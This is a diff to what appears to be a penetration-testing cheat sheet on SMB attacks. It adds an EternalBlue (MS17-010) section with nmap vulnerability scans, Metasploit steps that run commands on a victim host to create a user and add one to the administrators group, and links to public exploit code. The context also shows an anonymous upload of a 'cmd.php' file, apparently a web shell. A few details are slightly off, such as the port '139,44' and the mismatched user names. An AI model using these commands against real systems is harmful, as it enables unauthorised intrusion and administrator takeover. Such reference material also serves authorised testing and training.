@@ -68,6 +68,10 @@
   - [smbmap](#smbmap)
     - [smb_file_upload](#smb_file_upload)
   - [enum4linux](#enum4linux)
+  - [eternal blue](#eternal blue)
+    - [nmap script for eternal blue testing](#mmap_script)
+    - [metasploit modules for eternal blue testing](#eternal_blue_metasploit)
+    - [others tools for eternal blue testing](#tools_for_eternalblue)
   - [msfconsole smb payloads](#msfconsole)
   - [null Session](#null_session)
   - [Hydra bruteforce](#Bruteforce)
@@ -598,6 +602,38 @@ smbclient -N //<victim_ip>/<folder> -c 'put cmd.php cmd.php'
     - enum4linux -a [victim_ip]
   - enum4linux -a  [victim_ip]
   - enum4linux -u 'guest' -p '' -a  [victim_ip]
+  
+## eternalblue
+
+### mmap_script:
+```
+nmap -v --script vuln [victim_ip] -p 445,139
+nmap -sV -script smb-vuln-ms17-010.nse [victim_ip] -p 139,44
+```
+
+### eternal_blue_metasploit
+```
+example one:
+use auxiliary/admin/smb/ms17_010_command
+set rhosts: [victim_ip]
+set rport: 445
+set command: net user test test123! /add
+run
+set command: net localgroup administrators tester /add
+run
+
+example two:
+use exploit/windows/smb/ms17_010_psexec
+set rhosts [victim_ip]
+run
+```
+
+### tools_for_eternalblue
+- https://github.com/worawit/MS17-010
+- https://github.com/3ndG4me/AutoBlue-MS17-010
+- https://github.com/sailay1996/eternal-pulsar
+- https://gist.github.com/thel3l/993f8ed81a56e10525dd4812ad01ff2a
+- https://null-byte.wonderhowto.com/how-to/manually-exploit-eternalblue-windows-server-using-ms17-010-python-exploit-0195414/
     
 ## msfconsole
   - set rhosts 192.168.55.248
